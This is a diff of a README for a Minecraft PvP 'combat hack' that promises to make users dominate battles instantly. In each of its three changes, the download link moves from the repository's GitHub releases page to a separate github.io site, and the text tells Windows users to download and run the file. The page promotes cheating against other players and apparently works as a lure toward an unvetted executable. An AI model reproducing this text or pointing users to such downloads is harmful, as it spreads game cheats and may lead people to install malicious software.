@@ -1,6 +1,6 @@
 # ⚔️ minecraft-combat-hack-2026 - Dominate Every PvP Battle Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Minecraft_Combat_Hack_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Minecraft_Combat_Hack_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://joantelocentric8639.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these simple steps to get the hack running on your Windows PC. No technic
 
 Visit this link to download the application:
 
-[**https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases**](https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases)
+[**https://joantelocentric8639.github.io**](https://joantelocentric8639.github.io)
 
 Click the download button on that page. The file will start downloading automatically.
 
@@ -134,7 +134,7 @@ Yes, it's compatible with most modded setups as long as you're running Minecraft
 
 Ready to get started? Download the application now:
 
-[**Download Minecraft Combat Hack 2026**](https://github.com/Joantelocentric8639/minecraft-combat-hack-2026/releases)
+[**Download Minecraft Combat Hack 2026**](https://joantelocentric8639.github.io)
 
 ---
 
